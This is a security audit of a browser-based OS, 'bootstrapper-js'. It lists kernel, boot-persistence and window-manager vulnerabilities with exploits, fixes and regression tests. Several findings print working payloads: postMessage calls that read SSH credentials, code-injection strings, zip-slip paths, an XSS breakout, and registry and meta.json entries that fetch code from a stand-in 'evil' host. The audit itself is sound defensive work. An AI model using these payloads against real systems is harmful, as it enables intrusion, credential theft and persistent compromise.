# Security audit — running untrusted apps

Audit of bootstrapper-js against the target model in [README.md](README.md): only the layout touches
the top document; every app runs in an opaque-origin sandbox with mediated vfs/IndexedDB access.
Findings are grouped by area; IDs are stable and referenced from [/TODO.md](../../TODO.md) and the
test suite (`testing/scripts/security/`).

**Severity**: Critical = remote or zero-click takeover of the whole vfs/session · High = an app, peer or
file escapes to full privileges or reads secrets · Medium = needs unusual user action or limited impact ·
Low = defense in depth.

**Attackers**: A1 malicious/compromised app · A2 malicious file content opened in a first-party viewer ·
A3 malicious WebRTC peer · A4 malicious website (opens the OS in a popup, is opened by it, is embedded by
an app, or embeds the OS) · A5 malicious SSH host/bridge/network service · A6 malicious deep link / URL.

**Fix tags**: [quick] = fixable in place now · [runtime] = needs the sandboxed app runtime / capability broker.

## Status after phase 1 (2026-11-21)

Every phase-1 regression check failed on the pre-fix code (baseline 0/121) and is re-run by
`testing/scripts/security/run-all.mjs`; results in `testing/scripts/security/results/`.

| Status | Findings |
|---|---|
| **Fixed** | KRN-1, KRN-2, KRN-3, KRN-7, KRN-9, KRN-10, KRN-11, KRN-13 · BOOT-4, BOOT-6, BOOT-8, BOOT-9, BOOT-11, BOOT-12 · WIN-2, WIN-3, WIN-4, WIN-5, WIN-6, WIN-7, WIN-8, WIN-10 · NET-1, NET-2, NET-3, NET-4, NET-5, NET-8, NET-9, NET-10, NET-12, NET-13 · APP-1 – APP-11, APP-14 |
| **Partly fixed** (rest needs the phase-2 runtime) | KRN-4 — opening no longer runs, WM/desktop/menu modules run from static copies; widgets, cron, systemd units and `/etc/settings` sections still execute vfs code in the top realm · KRN-5 — ACL normalised and narrowed, still advisory while apps hold `getFS()` · KRN-6 — SDK handshake hardened, `sandboxAppIframe` still same-origin · KRN-8 — replies bound to asked top-level tabs; another OS tab could still answer · KRN-12 — names validated; handoff still observable by same-origin code · BOOT-5 — as KRN-4 · BOOT-10 — appDir derived from the id; `/etc/pkg` still app-writable · NET-6 — mutations confirmed; no per-app permissions · NET-7 — bridge origin approval; key still in origin-wide IndexedDB · NET-11 — group consent, `autoMesh` off; identity unauthenticated · APP-12 — ts-ide fixed; Pyodide's `js` module still reaches `top` · APP-13 — picker/URLs fixed; custom-widget `code` still `new Function` |
| **Open → phase 2** | WIN-1 (same-origin windows), WIN-9 (process ops without caller identity), APP-15 (apps reaching into `top`) |
| **Informational** | NET-14 (relay/, v2/ not deployed) |

---

## KRN — kernel, IPC, service worker, globals

### KRN-1: Unauthenticated raw-fs + window-manager IPC on the top window
- **Severity**: Critical · **Attacker**: A4, A1, A2
- **Where**: `src/kernel/ipc-bus.ts:69-85` (listener), `:124-140` (fs handlers), `:89-92` (`wm.launch`/`toggleWindow`), `:95-121` (dock). Reachable from frames the code considers sandboxed: dock srcdoc (`src/core/layout/index.tsx:1258`), canvas wallpaper (`:376`), `ui.sandboxed-app` (`src/core/iframe/index.tsx:81`).
- **Root cause**: answers any `{type:'wos-ipc'}` message from any `event.source`/origin with raw `fs` (no ACL), replies with targetOrigin `'*'`.
- **Exploit**: a site opens the OS in a popup (or is opened by it / embedded by the Browser app / framed by YouTube) and posts `{type:'wos-ipc',id:1,event:'fs.readText',data:{path:'/home/user1/.local/share/remote-machines/connections.json'}}` → SSH passwords/keys come back; `fs.write` to `/opt/window-manager.js` → attacker JS runs in the top realm on the next window open (`src/core/window-manager.ts:184`).
- **Fix**: [quick] accept only from kernel-registered app frames, route through that frame's ProxyFS, drop raw fs handlers, reply to `e.origin`. [runtime] per-app MessageChannel ports only.
- **Test**: a page on another origin opens the OS and posts `fs.readText` → no response; an unregistered `sandbox=allow-scripts` frame posting to `top` gets nothing.

### KRN-2: `?app=` / `?apps=` URL launcher → code injection into the top realm
- **Severity**: Critical · **Attacker**: A6, A4
- **Where**: `src/remote.ts:239-265` (`:243` `command('${app}')` unescaped) → `new Function` at `src/shared/index.ts:389`.
- **Root cause**: untrusted query parameter pasted into DSL source; also opens any command with attacker args without the deep-link opt-in.
- **Exploit**: `/?app=explorer'),PAYLOAD,('` evaluates PAYLOAD with full vfs ~4 s after boot. Without injection: `?app=ui.iframe&args=<b64 ["https://evil"]>` loads a hostile page inside the OS → KRN-1.
- **Fix**: [quick] remove, or restrict to `meta.deepLink===true` + `NAME_RE`, passing values only as `$args` (as `usr/bin/deeplink.js:88` does).
- **Test**: open `/?app=explorer'),(window.top.__pwned=1),('` → `__pwned` stays undefined.

### KRN-3: File paths/args interpolated into `execCommand` source
- **Severity**: High · **Attacker**: A3, A5, A1 (also files dropped from the user's disk)
- **Where**: `src/shared/index.ts:437-439,483`; dead duplicate `src/platform/exec-engine.ts:115,144`; `src/core/layout/index.tsx:1117,1413-1424,1467`; `src/remote.ts:406`; reached from Files via `opt/apps/file-explorer/main.js:891` → `host.exec`.
- **Root cause**: command lines built by templating `'${filepath}'` / `"${x}"` with no escaping.
- **Exploit**: a peer sends (or an SSH folder lists) a file named `a'),platform.host.getFS().writeFileSync('/home/user1/initd.run',…),('.txt`; double-click → top-realm code execution.
- **Fix**: [quick] stop generating code: call `getService('001-core.layout','open-window')(getCommand(n), path, ...args)` directly, or pass values only via `$args`.
- **Test**: `host.exec` on such a file name opens Notepad with no side effect.

### KRN-4: vfs code evaluated in the top realm behind an escapable shim
- **Severity**: High · **Attacker**: A1, A2, A3
- **Where**: `src/shared/index.ts:365-391` (execCommand), `:393-428` (execString — shim `:417`, `factory.call(this)` hands over the Host `:422`), `:584-647` (`require`, incl. remote fetch + eval `:604-619`). Sinks: `Host.exec` for `.js`/`.run` (`:466-477`), systemd ExecStart (`src/core/systemd.ts:246-251`), cron (`src/core/cron.ts:59-64`), widgets (`src/remote.ts:126-143`), `/opt/window-manager.js` + `/opt/wm/*.js` on every window (`src/core/window-manager.ts:184,204`).
- **Root cause**: `new Function` runs in the top window's realm; `platform.window`, `document.defaultView`, `top`, `this`, `Function('return this')()` all reach the real window. Any vfs write therefore becomes persistent full compromise (`initd.run`, `/etc/crontab`, `/etc/widgets/`, `/etc/systemd/system/`).
- **Fix**: [runtime] execute vfs code only in opaque-origin realms (hidden sandboxed iframe for headless scripts); system scripts from the static server copy, never from the writable vfs. [quick] deny non-kernel writes to `/etc`, `/bin`, `/usr`, `/opt`, `initd.run`.
- **Test**: an opened vfs `.js` that touches `window.top.document` gets a SecurityError.

### KRN-5: Namespace ACL bypassable and over-broad
- **Severity**: High · **Attacker**: A1
- **Where**: `src/platform/namespace.ts:39-47,50-57`; every op in `src/platform/proxy-fs.ts`; `src/core/window-manager.ts:228` (spawn id = command name).
- **Root cause**: no normalisation of targets or entries (`/tmp/../etc/crontab` matches the rw `/tmp` rule); appDir built from an unvalidated command name (`../../etc` → writable `/etc`); catch-all `{'/', read:true}` exposes every secret (e.g. `remote-machines/connections.json` password/privateKey); shared world-writable `/tmp`, `/var/log`. The ACL is advisory anyway — apps also have `host.getFS()`, `window.fs`, KRN-1 and `/(sw)/` reads.
- **Fix**: [quick] normalise `.`/`..`/`//`/NUL on both sides; validate ids `^[a-z0-9][a-z0-9._-]*$` (no `..`); deny-by-default read (own dirs + explicit grants); per-app `/tmp/<id>`. [runtime] ProxyFS is the only fs an app can reach.
- **Test**: `checkWrite('/tmp/../etc/crontab')` throws; foreign app `checkRead('/home/user1/.local/share/remote-machines/…')` throws.

### KRN-6: "Sandboxed" app iframes are same-origin; SDK handshake unauthenticated
- **Severity**: High · **Attacker**: A1
- **Where**: `src/core/window-manager.ts:440` (`allow-scripts allow-same-origin`, used by ts-ide, cpp-ide, nn-ide, alpine-wasm, ai-dom-lens, vector-store, trainboard, snake apps); `:444` port posted on `load` to `'*'`; `src/sw.ts:25` bootstrap accepts the first `wos:sdk-init` from any source and its `{once:true}` listener is consumed by the first message of any type; `src/core/iframe/index.tsx:187` full platform injected into same-origin frames.
- **Root cause**: `allow-scripts` + `allow-same-origin` = no isolation (`frameElement.removeAttribute('sandbox')`, `top.fs`, IndexedDB). If the frame navigates, the ProxyFS port goes to the new page.
- **Fix**: [runtime] opaque origin (no `allow-same-origin`), code from the static `/public/mount/...` copy or srcdoc; nonce handshake; check `ev.source === parent`.
- **Test**: inside the app, `parent.document` and `indexedDB.open()` throw.

### KRN-7: SW serves vfs content as active same-origin documents
- **Severity**: High · **Attacker**: A3, A4, A6, A1
- **Where**: `src/sw.ts:93-156` (`new Response` `:132`), `:36-46` (getMIMEtype returns `undefined`), `:115`, `:142` (fallback fetches).
- **Root cause**: a navigation to `/(sw)/<path>` is answered from the open OS tab with no `CSP: sandbox`, no `nosniff`; unknown extensions get no usable Content-Type (sniffing — unverified).
- **Exploit**: plant `/mnt/webrtc/x/a.html` (or `.svg`) and link to `https://pankajdevesh.com/(sw)/mnt/webrtc/x/a.html` → runs first-party with IndexedDB/localStorage.
- **Fix**: [quick] every `/(sw)/` and `/cache` response gets `Content-Security-Policy: sandbox allow-scripts allow-forms allow-modals`, `X-Content-Type-Options: nosniff`, default `application/octet-stream`, `Cross-Origin-Resource-Policy: same-origin`.
- **Test**: navigate to `/(sw)/tmp/x.html` → `self.origin === 'null'`, `localStorage` throws.

### KRN-8: SW reply spoofing / request broadcast
- **Severity**: Medium · **Attacker**: A1 (same-origin contexts)
- **Where**: `src/sw.ts:17` (sequential ids), `:53-61` (`fs/reply` accepted from any client; null `event.data` dereference), `:136-142` (path broadcast to all clients).
- **Root cause**: no source binding; predictable ids.
- **Fix**: [quick] one registered kernel client per request (per-request MessageChannel), random ids, check `event.source.id`.
- **Test**: a forged reply from a second tab is ignored.

### KRN-9: Persistent kernel swap via localStorage
- **Severity**: High · **Attacker**: A1 (persistence)
- **Where**: `src/index.ts:6-13`; also `src/kernel/vfs.ts:15-20` (`?fsBackend=` link switches the backend persistently — Low).
- **Root cause**: `localStorage.__BOOTSTRAP_SCRIPT_PATH__` names any script URL, loaded as the kernel on every boot; survives meta.json `force_reload` and is invisible in the vfs.
- **Fix**: [quick] hard-code `/remote.bundle.js` (dev allowlist); confirm before applying a URL-requested backend switch.
- **Test**: set the key, reload → only `/remote.bundle.js` loads.

### KRN-10: Command / file-handler hijacking
- **Severity**: Medium · **Attacker**: A1
- **Where**: `src/shared/index.ts:181-216` (warn only), `:340-357` (extension default picked by title sort), `src/platform/command-registry.ts:34-47`.
- **Root cause**: newest registration wins, nothing reserved — any code can take over `explorer`, `ui.notepad`, `ui.iframe`, `ui.settings`, `notify`, or claim `.txt` with title "AAA".
- **Exploit**: re-register `ui.remote-machines` with a phishing login that captures SSH credentials.
- **Fix**: [quick] reserve system names, reject duplicates from a different owner. [runtime] names owned by app id; user/kernel chooses default handlers.
- **Test**: a second `registerCommand('ui.notepad')` from an app is rejected.

### KRN-11: No framing / opener defence; authority on window globals
- **Severity**: Medium · **Attacker**: A4
- **Where**: `docs/public/index.html`, `docs/404.html` (no CSP, no frame check); globals at `src/kernel/vfs.ts:77`, `src/remote.ts:148,158`, `src/platform/command-registry.ts:29`, `src/platform/message-bus.ts:39`, `src/platform/process-manager.ts:41`.
- **Root cause**: boots when framed/opened by any origin; `fs`, `platform`, `__wosHost`, `require`, `BrowserFS`, registries exported on the top window. Storage partitioning limits framing to clickjacking; on unpartitioned browsers KRN-1 gives a full read.
- **Fix**: [quick] refuse to boot when `top !== self` with a cross-origin parent; meta CSP (`object-src 'none'; base-uri 'self'`; script-src self + cdnjs + `'unsafe-eval'` for Babel until execString leaves the top realm). [runtime] move globals into kernel closure state.
- **Test**: a cross-origin page embeds the OS → boot refused.

### KRN-12: Deep-link handoff observable / swallowable
- **Severity**: Low · **Attacker**: A1
- **Where**: `src/kernel/deeplink.ts:44-65`, `docs/public/mount/usr/bin/deeplink.js:40-60,66-71`.
- **Root cause**: any same-origin listener sees `open` messages (SDP/IPs) and can `ack` so the new tab never boots; `NAME_RE` allows `.`/`..` → `/opt/apps/../main.js`.
- **Fix**: [quick] forbid leading dot / `..`. [runtime] only the kernel holds the channel.
- **Test**: an app acking doesn't stop the handoff.

### KRN-13: Broadcasts with targetOrigin `'*'`
- **Severity**: Low · **Attacker**: A4
- **Where**: `src/kernel/ipc-bus.ts:47-51`, `src/core/layout/index.tsx:387,394`, `src/core/window-manager.ts:275`.
- **Root cause**: titles/paths, pointer position and signals posted to whatever document a frame currently holds.
- **Fix**: post only to registered app ports.
- **Test**: a frame navigated cross-origin receives nothing.

**KRN architecture notes**
- Ambient authority handed out today: raw `fs` (incl. `mount`/`umount`/`createBackend`, `src/kernel/vfs.ts:84-87`), `getService(anyModule, anyService)`, `execCommand`/`execString`/`require` (string eval), global shadowable `registerCommand`, DOM helpers on Host (`appendDomElement`, adoptedStyleSheets), window globals. The broker replaces these with per-app MessageChannel RPC: fs (normalised, deny-by-default, own dirs + user grants), commands (invoke by name with structured args; register only in own namespace), window ops, notifications/events (`vfs:changed`).
- Remove every `execCommand` DSL call site — the DSL is the injection surface (KRN-2/3); use structured `{command, args}`.
- `src/platform/exec-engine.ts` is unused and duplicates the KRN-3 injections — delete or rebuild as the broker. ProcessManager/MessageBus/CommandRegistry hang off `window.top`, so `fromPid` is forgeable by any same-origin code — keep them in kernel closure state keyed by port.
- Auto-run sinks (systemd units, cron, widgets, `initd.run`, `window-manager.js`, `/opt/wm/*.js`, settings sections, the pkg loader) must run in sandboxed realms or from integrity-checked server copies.

---

## BOOT — boot-time / persistent code execution, packages, shell

Duplicates merged into KRN: BOOT-1 → KRN-2 (`?app=` injection), BOOT-2 → KRN-3 (file names in DSL —
extra sinks: `opt/apps/file-explorer/main.js:876,891`, `src/apps/file-explorer/index.tsx:768,772`,
`src/core/layout/index.tsx:1413-1424,1467`, `opt/apps/pkg-manager/main.js:130-137`), BOOT-3 → KRN-4
(opening `.js`/`.run` = execute in the top realm; quick fix: default "open" for scripts outside
`/bin`, `/usr/bin`, `/opt/apps` is the editor, running needs explicit consent), BOOT-7 → KRN-9
(bootstrap-script override; also add meta CSP `script-src 'self' https://cdnjs.cloudflare.com`).

### BOOT-4: Package install = unverified code execution + path traversal
- **Severity**: High · **Attacker**: A1, malicious/third-party registry, A5
- **Where**: `docs/public/mount/opt/apps/pkg-manager/main.js:236-293` (`installApp`: `appDir=/opt/apps/${appMeta.id}`, writes `${appDir}/${file.dest}` and executes `${appDir}/${appMeta.main}` immediately `:257-268`); `:24-27` any http(s) `src`; `:172-226` backup/restore paths from registry `dest`; no hash/signature anywhere (`docs/registry.json` has no integrity fields).
- **Root cause**: registry entries are trusted for paths and code; install runs app code in the top realm.
- **Exploit**: a user-added registry serves `{"id":"x","files":[{"src":"https://evil/p","dest":"../../../.initd.run"}],"main":"m.js"}` → `/.initd.run` overwritten (permanent boot-time code) and `m.js` runs at once.
- **Fix**: [quick] validate `id` (`^[a-z0-9][a-z0-9-]{0,63}$`); normalise `dest`/`main` and reject anything absolute or escaping `appDir`; per-file `sha256` verified with `crypto.subtle` before writing; explicit consent + warning for non-built-in registries. [runtime] declarative installs (manifest only, no code at install).
- **Test**: a fixture registry with `dest:"../../../.initd.run"` is rejected and `/.initd.run` unchanged; a wrong sha256 is rejected.

### BOOT-5: Executable boot/session hooks are ordinary writable vfs files
- **Severity**: High · **Attacker**: A1, A2 (via BOOT-8)
- **Where**: 44 `meta.json` entries with `force_reload` false/absent, plus directory scans that execute files not in meta.json: `src/remote.ts:126-140` (all `/etc/widgets/*.js`), `opt/apps/settings/main.html:451-475` (all `/etc/settings/*.js`, each Settings open), `src/core/systemd.ts:236-252,336-340` (enabled units' `ExecStart`), `src/core/cron.ts:56-66` (crontab = raw DSL), `opt/apps/pkg-manager/loader.js:74-78` (any `installed.json` `mainFile` ending `.js`, any path), `src/core/window-manager.ts:176-205` (`/opt/window-manager.js` + `/opt/wm/${wmId}.js`, `wmId` from `/etc/managers.json`, `..` allowed), `src/core/layout/index.tsx:974` (`/opt/desktop/${desktopId}.js`), `:1439` (`/etc/contextmenu.json` `cmd`), `/home/user1/initd.run` → `/.initd.run`.
- **Root cause**: system code is loaded from writable storage; `force_reload` restores only listed files; ids read from config aren't validated.
- **Exploit**: write `/etc/systemd/system/x.service` + add it to `enabled.json`, or `/etc/widgets/x.js`, or set `managers.json` `"windowManager":"../../home/user1/x"` → top-realm payload on every boot/window.
- **Fix**: [quick] load first-party system code from the immutable server copy (`/public/mount/...`); validate config ids (`^[a-z0-9-]+$`); `mainFile` must live in `/opt/apps/<id>/`. [runtime] `/bin`, `/usr`, `/etc`, `/opt`, `/meta.json`, `/.initd.run` kernel-owned; user hooks (widgets, cron, initd, settings sections) run sandboxed.
- **Test**: a sandboxed app writing each path in the table below is denied; a pre-seeded `/etc/widgets/evil.js` doesn't run in the top realm after reload.

### BOOT-6: Writing `/meta.json` disables server refresh and enables remote payloads
- **Severity**: High · **Attacker**: A1
- **Where**: `src/kernel/vfs.ts:107-123`.
- **Root cause**: the vfs `/meta.json` is read first; an entry `{path:'/meta.json',force_reload:false}` means the server list is never fetched again, and `file:'https://…'` entries are fetched cross-origin every boot.
- **Exploit**: one write — `[{path:'/meta.json',file:'/meta.json',force_reload:false},{path:'/opt/apps/file-explorer/main.js',file:'https://evil/fe.js',force_reload:true}]` → self-updating implant in a core app; every "restored at boot" protection is off.
- **Fix**: [quick] always fetch the server `meta.json` and ignore the vfs copy for reload decisions; accept only same-origin `/public/mount/` sources (or hashed ones).
- **Test**: seed that `/meta.json`, reload twice → explorer `main.js` equals the server copy; no request to the external host.

### BOOT-8: Archive extraction escapes the target folder (zip-slip)
- **Severity**: High · **Attacker**: A2, A3
- **Where**: `opt/apps/file-explorer/main.js:60-74` (`normalizePath` resolves `..`, no containment check), duplicated in `opt/apps/explorer-sifi/main.js:51+`; `bin/unzip.run:116-128`; `bin/tar.run:117-122`.
- **Root cause**: entry names are joined onto the destination with no check that the result stays inside it.
- **Exploit**: a zip containing `../../../.initd.run` or `../../etc/widgets/x.js` → extraction plants persistent top-realm code.
- **Fix**: [quick] after normalising require `full === dest || full.startsWith(dest + '/')`; reject absolute names, `..`, NUL and protected roots.
- **Test**: build the zip in-test (fflate), extract via explorer and `unzip`/`tar -x` → nothing lands outside the destination.

### BOOT-9: Deep-link `app` loading ignores install state; opt-in is self-declared
- **Severity**: Medium · **Attacker**: A6, A1 (extends KRN-12)
- **Where**: `docs/public/mount/usr/bin/deeplink.js:19,64-75`, `src/kernel/deeplink.ts:24`.
- **Root cause**: `NAME_RE` allows `..` (`/opt/apps/../main.js` → `/opt/main.js`); a link runs any `/opt/apps/<id>/main.js` in the top realm even if it's in `uninstalled.json`; `deepLink:true` is meta any registrant can set, and the latest registration shadows an existing name (`src/shared/index.ts:181-200`).
- **Fix**: [quick] app id regex `^[a-z0-9][a-z0-9-]*$`; only load installed, non-uninstalled apps. [runtime] deep-link opt-in declared in kernel-held manifests; command names namespaced per app.
- **Test**: `#open=x&app=..` doesn't run `/opt/main.js`.

### BOOT-10: Uninstall / rollback trust writable package metadata
- **Severity**: Medium · **Attacker**: A1
- **Where**: `opt/apps/pkg-manager/main.js:301-321` (runs `pre-uninstall.js` in the top realm, then `deleteDirRecursive(pkg.appDir)` with `appDir` from writable `/etc/pkg/installed.json`); `:197-226` rollback copies anything planted under `/etc/pkg/backups`; `opt/apps/pkg-manager/loader.js:15,63` reads `uninstalled.json` (any app can permanently disable core apps).
- **Fix**: [quick] derive `appDir` from the validated id; drop or sandbox `pre-uninstall`. [runtime] `/etc/pkg` kernel-owned.
- **Test**: `installed.json` with `appDir:'/home/user1'` → uninstall removes only `/opt/apps/<id>`.

### BOOT-11: Libraries loaded from the vfs into the top realm
- **Severity**: Low · **Attacker**: A1
- **Where**: `opt/apps/file-explorer/main.js:47-56` (`/usr/lib/fflate.min.js` via `new Function`), `src/core/layout/contextmenu.tsx:34-41` (`/usr/lib/ui/menuItem.js` via `execString` inside the layout).
- **Fix**: [quick] bundle with webpack or load from `/public/mount` with integrity.
- **Test**: tamper with `menuItem.js`, open the context menu → payload doesn't run.

### BOOT-12: Terminal command lookup + writable `/bin`
- **Severity**: Low · **Attacker**: A1
- **Where**: `opt/apps/terminal/main.html:533-543` (`${dir}/${command}.run`, no `..` check); `/bin`, `/usr/bin` writable and new commands persist; `curl.run` writes response bodies raw to xterm (escape sequences pass through).
- **Fix**: [quick] reject `/` and `..` in command names. [runtime] bin dirs kernel-owned.

### Persistence targets — all run in the top window today, all writable by any app

| Path | Runs | Via | meta.json force_reload |
|---|---|---|---|
| `/.initd.run` | every boot (from `initd.run`) | execCommand | false — persists |
| `/home/user1/initd.run`, `pkg-manager/loader.js`, `/usr/bin/deeplink.js` | every boot | exec | true (restored) |
| 25 CORE_APPS `main.js` | boot + deep links | execString | true (persists with BOOT-6) |
| `/etc/pkg/installed.json` → any `mainFile` | every boot | execString | false |
| `/etc/systemd/enabled.json`, `system/*.service`, `/opt/systemd/**` | every boot | exec / DSL | false |
| `/etc/crontab`, `/opt/cron/*.js` | every minute | exec / raw DSL | false |
| `/etc/widgets/*.js` (any file) | every boot | execString | listed true, new files persist |
| `/etc/settings/*.js` (any file) | each Settings open | execString | listed true, new files persist |
| `/opt/window-manager.js`, `/opt/wm/<id>.js` (id from `managers.json`) | every window open | execString | false |
| `/opt/desktop/<id>.js` | desktop mount | execString | listed true, new persist |
| `/etc/contextmenu.json` `cmd` | menu click | execCommand | false |
| `/usr/lib/ui/menuItem.js`, `/usr/lib/fflate.min.js` | context menu / zip | execString / Function | true |
| `/bin/*.run`, `/usr/bin/*.run` | when typed, xargs, cron | execCommand | listed true, new persist |
| `/opt/apps/dock/<id>.html` | boot | opaque srcdoc iframe (defeated by KRN-1) | false |
| `/meta.json` | boot — decides every refresh | controls all of the above | true unless self-disabled (BOOT-6) |
| localStorage `__BOOTSTRAP_SCRIPT_PATH__` | first script at boot | `<script src>` | outside the vfs (KRN-9) |

**BOOT architecture notes**
- Declarative installs: `manifest.json` = id, version, entry HTML, `commands[{name,title,icon,fileExtensions,deepLink}]`, `permissions{fs,net,…}`, `files[{path,sha256}]`, window size. The kernel registers launcher stubs from it; no app code runs in the top realm at install or boot.
- Integrity: build-time sha256 for every built-in registry file, verified on install/update; third-party registries need per-install consent (or a pinned key).
- First-party code executes from the immutable server copy; vfs copies are view-only, so `force_reload` stops being a security mechanism.
- Kernel-owned paths: `/bin`, `/usr`, `/etc`, `/opt`, `/meta.json`, `/.initd.run`, `/home/user1/initd.run`. Apps get their own data dir plus user grants (per-file grant on "open with").
- Retire the string DSL: structured `{command, args}`; context-menu and cron actions stored as data. URL launches (`?app=`, `#open=`) through one validated entry point with manifest-declared opt-in.
- Out of the top realm: CORE_APPS `main.js` (→ manifests), `initd.run`, cron, systemd units, widgets (sandboxed frames in kernel slots), `/etc/settings` sections (inside the Settings sandbox); `/opt/window-manager.js`, `/opt/wm/*.js`, `/opt/desktop/*.js`, `menuItem.js`, fflate → compiled layout code or declarative config; `/bin/*.run` → inside the calling terminal's sandbox.
- Schema-validate config JSON: `managers.json`, `contextmenu.json`, `installed.json`, `enabled.json`, `crontab`, `keybindings.json`.

---

## WIN — window manager, app hosting, layout, compiled apps

Duplicates merged: WIN-2 → KRN-3 (more DSL sinks: `src/apps/notepad/index.tsx:188`,
`src/apps/markdown/index.tsx:133-136`, `src/apps/file-explorer/index.tsx:847-880`,
`opt/apps/file-explorer/main.js:975-1105` — the multi-select variant uses `encodeURIComponent`, which
leaves `'` unescaped; a name like `a'+alert(origin)+'.png` fires on double-click or any context-menu
item). WIN-6 → BOOT-5 (`/opt/window-manager.js`, `/opt/wm/<id>.js`, `/opt/desktop/*.js`,
`menuItem.js`, `/etc/contextmenu.json` `cmd` run in the top realm during routine UI actions).

### WIN-1: Windows are not isolated from the top document (root cause)
- **Severity**: High · **Attacker**: A1 (and anything that gets script into a window via A2/A3)
- **Where**: `src/core/window-manager.ts:367-369` (window iframe: no src, no sandbox → same-origin about:blank), `:396-486` (`command.exec(iframeBody, props)`), `:434-441` (`sandboxAppIframe` = allow-scripts + allow-same-origin); `opt/apps/snake-game/main.js:12-20` (`src=/(sw)/…`); `src/shared/index.ts:393-428` (execString runs vfs code in the top realm; the shim hands over real `document`/`top`).
- **Root cause**: app callbacks run in the top window's realm and render into a same-origin child document; the only "sandbox" doesn't isolate.
- **Exploit**: `top.fs.readFileSync(...)`, `indexedDB.open(...)`, or `top.document.querySelectorAll('.window iframe')[n].contentDocument` reads/drives every other window (terminal, chats, typed SSH passwords).
- **Fix**: [runtime] every window = `<iframe sandbox="allow-scripts …">` without allow-same-origin; app code never runs in the top realm; chrome actions via MessageChannel RPC.
- **Test**: attacker app asserts `top.document`, `parent.document`, `indexedDB`, `localStorage` and a sibling window's `contentDocument` all throw.

### WIN-3: Opening a file executes it with full privileges, no prompt
- **Severity**: High · **Attacker**: A2, A3 (extends KRN-4)
- **Where**: `src/shared/index.ts:447-456` (html/svg/ico → `ui.iframe`), `:466-475` (`.js` → execString, `.run` → execCommand), `:340-357` (default handler chosen by title sort, so "Browser" beats "Image Viewer" for `.svg`); `src/core/iframe/index.tsx:24-34` (`/(sw)` URL), `:187` (`contentWindow.platform` = full Host), `:194` (child `fetch` patched with the parent realm's fetch), `:227` (no sandbox).
- **Root cause**: "open" means "run" for scripts, HTML and SVG; no provenance, no confirmation.
- **Exploit**: a peer sends `cat.svg` with `<script>top.fs.writeFileSync(…)</script>`; the user double-clicks an "image".
- **Fix**: [quick] `.js`/`.run` open in Notepad (running needs an explicit Run + confirmation naming the file); `.svg`/`.ico` open in the image viewer as `<img>`; `.html` only in an opaque-origin srcdoc viewer without platform; SW adds `CSP: sandbox` to vfs HTML/SVG (KRN-7). [runtime] executables only as sandboxed processes.
- **Test**: drop `evil.svg` and `evil.html` (both set `top.pwned=1`), double-click each → `top.pwned` undefined.

### WIN-4: Browser (`ui.iframe`) embeds remote origins unsandboxed
- **Severity**: Critical (with KRN-1) · **Attacker**: A4
- **Where**: `src/core/iframe/index.tsx:105` (URLs not starting with `/` used verbatim), `:227`; also youtube-player, bookmarks, dashboard; `src/apps/vs-code/index.tsx:37,126` (`code-public.pankajdevesh.com`).
- **Root cause**: third-party pages sit inside the OS frame tree with no sandbox.
- **Exploit**: any page opened in the Browser does `top.postMessage({type:'wos-ipc',event:'fs.write',data:{path:'/opt/window-manager.js',…}},'*')` → persistent full read/write (WIN-6); can also navigate `top` for phishing with a user gesture.
- **Fix**: [quick] cross-origin URLs get `sandbox="allow-scripts allow-same-origin allow-forms allow-popups allow-popups-to-escape-sandbox"` + `referrerpolicy=no-referrer` (allow-same-origin is safe only because the origin differs; no allow-top-navigation); any URL whose origin equals `location.origin` (incl. absolute `/(sw)` URLs) goes through the vfs-app path without allow-same-origin; fix KRN-1.
- **Test**: a cross-origin fixture page in the Browser posts `wos-ipc fs.readText(canary)` → no data.

### WIN-5: HTML/CSS injection into the top document via window chrome and Host
- **Severity**: Medium today, High once apps are sandboxed (it becomes the escape into the layout) · **Attacker**: A1, data-derived command metadata (e.g. `opt/apps/python-demo/main.js:51`)
- **Where**: `src/core/window-manager.ts:597` (`titleText.innerHTML = meta.title`), `:605` (icon), `:667` (`appendActionButton` icon), `:649-652` (`Object.assign(head.style, meta.header.style)`), `:476-481` (`setBoundingClientRect` accepts any style key incl. `cssText`); `src/shared/index.ts:161-179` (`appendDomElement`, `addCSSStyleSheet` on the top document).
- **Exploit**: a title `<img src=x onerror=…>` runs script in the top document; `setBoundingClientRect({cssText:'position:fixed;inset:0;z-index:2147483647'})` → full-screen fake desktop/login.
- **Fix**: [quick] textContent everywhere; icons must match `^[a-z0-9_]+$`; allowlist header style keys/values; geometry accepts only clamped numeric left/top/width/height; `appendDomElement`/`addCSSStyleSheet` layout-only.
- **Test**: a command with an HTML title renders it as literal text; the `cssText` call has no effect.

### WIN-7: Opaque "sandboxes" (dock, `ui.sandboxed-app`, canvas wallpaper) still reach raw fs
- **Severity**: High · **Attacker**: A2, A3 (chain), A1 (extends KRN-1)
- **Where**: `src/core/layout/index.tsx:1240-1260` (dock srcdoc), `:370-380` (wallpaper); `src/core/iframe/index.tsx:66-81`; `src/kernel/ipc-bus.ts:124-140`; `src/core/layout/index.tsx:1135-1145` (`wm.launch` opens any command / calls any `callable`); `:1150` (window titles broadcast to every top-level iframe with `'*'`); `opt/apps/dock/gnome.html:153` (labels rendered with innerHTML).
- **Root cause**: correct opaque origins, but the global IPC listener serves anyone.
- **Exploit chain**: a file named `<img src=x onerror=…>.md` is opened → the viewer sets the window title to the name → the gnome dock renders it with innerHTML → script in the dock sandbox → `parent.postMessage(wos-ipc fs.write)` → persistent write (BOOT-5).
- **Fix**: [quick] IPC accepts only a registered frame's `e.source` and applies that frame's ACL (the dock only gets its settings file); docks render labels with textContent. [runtime] capability MessagePort per frame.
- **Test**: from the wallpaper/dock frame `fs.readText('/home/user1/secret')` → error; a malicious title in the gnome dock doesn't run script.

### WIN-8: Markdown viewer XSS (the default `.md` handler)
- **Severity**: High · **Attacker**: A2, A3
- **Where**: `src/apps/markdown/index.tsx:54-58` (escapes `& < >` but not `"`), `:80-81` (builds `src="$2"` / `href="$2"`), `:170` (`dangerouslySetInnerHTML` into the same-origin window document). `markdown-reader` also registers `ui.markdown` but isn't a core app, so the compiled viewer is the default.
- **Exploit**: `![x](x" onerror="top.fs.writeFileSync(…))` breaks out of the attribute; `javascript:` links aren't filtered.
- **Fix**: [quick] escape quotes, allowlist URL schemes, `rel=noopener`, DOMPurify (or render in an opaque iframe).
- **Test**: open the crafted `.md` → the `<img>` has no `onerror`; sentinel unset.

### WIN-9: Any code can kill or message any window
- **Severity**: Medium · **Attacker**: A1
- **Where**: `src/core/window-manager.ts:98-161`; `:65-89` (`/proc/<pid>/{meta,inbox}.json` are plain vfs files).
- **Root cause**: `process.kill`/`sigkill`/`send-message` take no caller identity; `process.list` exposes every window's title (often a file path).
